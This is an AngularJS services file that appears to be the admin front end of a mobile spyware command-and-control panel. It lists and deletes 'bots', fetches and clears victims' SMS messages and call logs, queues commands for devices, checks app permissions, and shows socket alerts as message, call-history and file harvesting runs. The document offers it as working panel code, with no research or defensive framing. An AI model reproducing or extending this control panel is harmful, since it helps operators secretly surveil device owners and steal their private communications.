App.service('BotService', ['$http', function($http) {

  this.fetch = function() {
    return $http.get('/bots');
  }

  this.get = function(id) {
    return $http.get('/bots/' + id)
  }

  this.delete =function(id) {
    return $http.delete('/bots/'+id)
  }

}])

.service('MessageService', [
  '$http',
  function($http) {
    this.fetch = function(uid) {
      return $http.get('/get-messages/' + uid)
    }

    this.clear = function(uid) {
      return $http.delete('/clear-messages/' + uid)
    }
  }
])

.service('CallLogService', [
  '$http',
  function($http) {
    this.fetch = function(uid) {
      return $http.get('/call-logs/' + uid)
    }

    this.clear = function(uid) {
      return $http.delete('/call-logs/' + uid)
    }
  }
])

.service('CommandService', [
  '$http',
  function($http) {
    this.add = function(cmd) {
      return $http.post('/add-command', cmd);
    }

    this.getPending = function(uid) {
      return $http.get('/pending-commands?uid=' + uid)
    }

    this.delete = function(id) {
      return $http.delete('/commands/' + id)
    }
  }
])

.service('PermissionService', [
  '$http',
  function($http) {
    this.fetch = function(uid) {
      return $http.get('/permissions/' + uid);
    }
  }
])

.factory('socket', [
  'socketFactory',
  '$timeout',
  'toastr',
  '$http',
  function(socketFactory, $timeout, toastr, $http) {
    var reconnectTime = 5; //s
    var socket = socketFactory();

    socket.on('test', function(msg) {
      console.log(msg)
    })

    socket.on('disconnect', function() {
      toastr.warning('Panel is offline', 'Disconnected');
    })

    socket.on('connect', function() {
      socket.emit('admin')
    })

    socket.on('reconnect', function() {

      socket.emit('admin')
      toastr.clear();
      toastr.success('Panel is connected', 'Info')

    })

    socket.on('getmessages:started', function(device) {
      toastr.info('Get SMS started.', device.device)
    })
    socket.on('getmessages:done', function(device) {
      toastr.success('Done getting SMS.', device.device)
    })

    socket.on('getcallhistory:started', function(device) {
      toastr.info('Get call history started.', device.device)
    })
    socket.on('getcallhistory:done', function(device) {
      toastr.success('Done getting call history.', device.device)
    })

    socket.on('nopermission', function(data) {
      console.log(data)
      toastr.error('App is denied a permission: ' + data.permission, data.device)
    })

    socket.on('download:started', function(data) {
      toastr.info('Download started', data.device)
    })

    socket.on('download:completed', function(data) {
      console.log(data)
      toastr.success('Download completed', data.device)
    })

    socket.on('download:error', function(data) {
      toastr.error(data.error, data.device)
    })

    return socket;
  }
])
